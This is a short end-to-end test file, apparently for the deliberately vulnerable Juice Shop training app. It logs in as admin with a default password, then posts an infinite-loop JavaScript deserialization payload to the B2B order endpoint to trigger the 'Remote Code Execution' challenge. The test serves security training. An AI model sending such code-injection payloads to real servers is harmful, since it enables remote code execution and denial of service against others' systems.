const config = require('config')

describe('/b2b/v2/order', () => {
  describe('challenge "rce"', () => {
    protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})

    it('should be possible to cause request timeout using an infinite loop deserialization payload', () => {
      browser.ignoreSynchronization = true
      browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.post(\'/b2b/v2/orders\', {orderLinesData: [\'(function dos() { while(true); })()\']});')
      browser.driver.sleep(3000) // 2sec for the deserialization timeout plus 1sec for Angular
      browser.ignoreSynchronization = false
    })

    protractor.expect.challengeSolved({challenge: 'Remote Code Execution'})
  })
})
